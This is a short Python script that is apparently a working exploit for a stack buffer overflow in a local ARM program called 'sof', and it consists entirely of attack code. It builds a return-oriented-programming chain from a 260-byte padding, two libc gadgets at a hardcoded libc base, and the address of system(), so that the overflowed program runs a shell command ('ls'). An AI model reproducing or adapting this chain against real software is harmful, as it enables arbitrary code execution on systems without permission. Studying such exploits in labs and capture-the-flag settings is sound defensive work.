#!/usr/bin/env python3
import struct
import subprocess

libc_base = 0xb6e5c000
gadget_1_offset = 0x00019270  # 0x00019270: pop {r3, pc};
gadget_2_offset = 0x000f47a8  # 0x000f47a8: mov r0, sp; blx r3;
system_offset = 0x39fac
payload_len = 260

payload = b"A" * payload_len
payload += struct.pack("<I", libc_base + gadget_1_offset)
payload += struct.pack("<I", libc_base + system_offset)
payload += struct.pack("<I", libc_base + gadget_2_offset)
payload += b"ls;#"

subprocess.call(["./sof", payload])

